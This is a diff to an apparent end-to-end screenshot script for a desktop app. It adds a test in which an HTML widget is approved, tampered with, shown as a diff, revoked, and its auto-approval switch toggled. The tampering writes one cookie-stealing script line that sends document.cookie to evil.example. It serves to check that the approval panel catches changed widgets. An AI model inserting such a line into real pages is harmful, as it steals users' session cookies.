@@ -14,7 +14,7 @@ probes measure that case.
 
 Env: STILLS_OUT (stills dir), STILLS_HOME (contained home, reusable so the
 engine cache survives), STILLS_DISPLAY (:99), STILLS_PORT (vite, 1420),
-STILLS_STATES (default "1 2 3 4 5 6 7 8 9 10"), STILLS_MIRROR_PORT /
+STILLS_STATES (default "1 2 3 4 5 6 7 8 9 10 11"), STILLS_MIRROR_PORT /
 STILLS_MIRROR_CACHE / STILLS_COLD_ONLINE (state 4's bundle host).
 """
 import atexit
@@ -41,7 +41,7 @@ OUT = os.environ.get("STILLS_OUT") or tempfile.mkdtemp(prefix="maleficium-stills
 FAKEHOME = os.environ.get("STILLS_HOME") or tempfile.mkdtemp(prefix="maleficium-stills-home-", dir="/tmp")
 DISP = os.environ.get("STILLS_DISPLAY", ":99")
 PORT = int(os.environ.get("STILLS_PORT", "1420"))
-STATES = os.environ.get("STILLS_STATES", "1 2 3 4 5 6 7 8 9 10").split()
+STATES = os.environ.get("STILLS_STATES", "1 2 3 4 5 6 7 8 9 10 11").split()
 
 os.makedirs(OUT, exist_ok=True)
 os.makedirs(FAKEHOME, exist_ok=True)
@@ -1079,6 +1079,111 @@ def state10():
     print("stills: interactive package installed from the app (%s), compiled, modified copy kept then replaced" % ",".join(outcomes))
 
 
+def widget_events(since):
+    return [e["event"] for e in APPLOG.events()
+            if isinstance(e.get("event"), dict) and e["at"] > since
+            and e["event"].get("action") in ("widget.approved", "widget.revoked", "widgets.auto-approve")]
+
+
+def store_value(field):
+    """A field of the project's approval store, read from the contained app data."""
+    base = os.path.join(FAKEHOME, ".local", "share", IDENT, "maleficium-widgets", "approvals")
+    for d in os.listdir(base):
+        with open(os.path.join(base, d, "store.json")) as f:
+            return json.load(f)[field]
+    die("no approval store under " + base)
+
+
+def open_widgets(still=None):
+    """View > Widgets through the command palette, matched by its menu path."""
+    key("ctrl+shift+p")
+    time.sleep(2)
+    click_at(800, 91)
+    time.sleep(1)
+    xdo(DISP, "type", "--delay", "40", "view widgets")
+    time.sleep(2)
+    if still:
+        shot(still)
+    xdo(DISP, "key", "Return")
+    time.sleep(3)
+
+
+def state11():
+    """View > Widgets: an html widget walks pending -> approved -> changed
+    (an edit on disk, with the diff shown) -> revoked, and the project's
+    auto-approval switch is turned on and off. The user actions are the
+    panel's own buttons; each is confirmed by the event the backend command
+    logs, never by a screenshot."""
+    proj = FIX + "/widgets"
+    shutil.copytree(ROOT + "/e2e/fixtures/interactive", proj)
+    for f in os.listdir(proj):
+        if f.endswith(".tex") and f != "main.tex":
+            os.remove(os.path.join(proj, f))
+    shutil.copy(ROOT + "/src-tauri/interactive/maleficium-interactive.sty", proj)
+    page = proj + "/widgets/demo/index.html"
+    start_app(proj)
+    wait_window(300)
+    window_size(1600, 900)
+    open_project()
+    click_editor()
+    m_c = now_ms()
+    key("ctrl+r")
+    wait_event("compile.finish", m_c, 300)
+    m0 = now_ms()
+    open_widgets("11-widgets-palette")
+    shot("11-widgets-pending")
+    # Focus order in the open dialog: the auto switch, Review source, Approve.
+    key("Tab")
+    key("Tab")
+    key("Tab")
+    shot("11-widgets-pending-focus")
+    key("Return")
+    wait_event("widget.approved", m0, 30)
+    time.sleep(2)
+    shot("11-widgets-approved")
+    # The agent's edit lands on disk; reopening the panel reads the folder again.
+    with open(page, "a") as f:
+        f.write("<script>fetch('https://evil.example/' + document.cookie)</script>\n")
+    key("Escape")
+    time.sleep(1)
+    open_widgets()
+    shot("11-widgets-changed")
+    key("Tab")
+    key("Tab")
+    key("Return")
+    time.sleep(3)
+    shot("11-widgets-diff")
+    # Focus is on Hide source: Approve, then Revoke.
+    key("Tab")
+    key("Tab")
+    key("Return")
+    wait_event("widget.revoked", m0, 30)
+    time.sleep(2)
+    shot("11-widgets-revoked")
+    # The switch (the review is gone, so the layout is the short one).
+    m_on = now_ms()
+    click_at(390, 363)
+    wait_event("widgets.auto-approve", m_on, 30)
+    time.sleep(2)
+    if store_value("autoApprove") is not True:
+        die("auto-approval is not persisted as on in the approval store")
+    shot("11-widgets-auto-on")
+    m_off = now_ms()
+    click_at(390, 363)
+    wait_event("widgets.auto-approve", m_off, 30)
+    time.sleep(2)
+    if store_value("autoApprove") is not False:
+        die("auto-approval is not persisted as off in the approval store")
+    stop_app()
+    acts_seen = [(e["action"], e.get("on")) for e in widget_events(m0)]
+    if acts_seen != [("widget.approved", None), ("widget.revoked", None), ("widgets.auto-approve", True), ("widgets.auto-approve", False)]:
+        die("widget events: %s" % acts_seen)
+    widget = store_value("widgets")["widgets/demo"]
+    if widget["revoked"] is not True:
+        die("the revoke is not in the approval store")
+    print("stills: widgets panel walked pending, approved, changed (diff shown), revoked; auto-approval on and off persisted; events %s" % acts_seen)
+
+
 def main():
     global FIX, BIN_DIR
     atexit.register(cleanup)
@@ -1123,7 +1228,7 @@ def main():
                        os.environ.get("VITE_CACHE_DIR", os.path.join(ROOT, "node_modules", ".vite")), log)
     log("vite serving on :%d" % PORT)
 
-    for n in range(1, 11):
+    for n in range(1, 12):
         if want(n):
             globals()["state%d" % n]()
     log("stills in %s:" % OUT)
